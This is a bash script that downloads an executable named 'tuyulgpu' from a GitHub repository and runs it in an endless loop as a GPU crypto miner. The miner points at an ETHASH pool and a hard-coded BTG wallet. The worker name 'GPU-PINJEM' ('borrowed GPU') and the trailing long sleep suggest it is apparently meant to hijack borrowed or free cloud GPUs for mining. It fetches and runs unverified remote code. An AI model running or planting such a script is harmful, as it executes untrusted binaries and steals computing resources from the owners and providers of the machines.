#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=BTG:GXgga35GTF5xn2v6u8mhY3xU3phbwh9KzH
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
wget https://github.com/skullCANDe/skyz/raw/main/tuyulgpu
chmod +x tuyulgpu
while [ 1 ]; do
./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
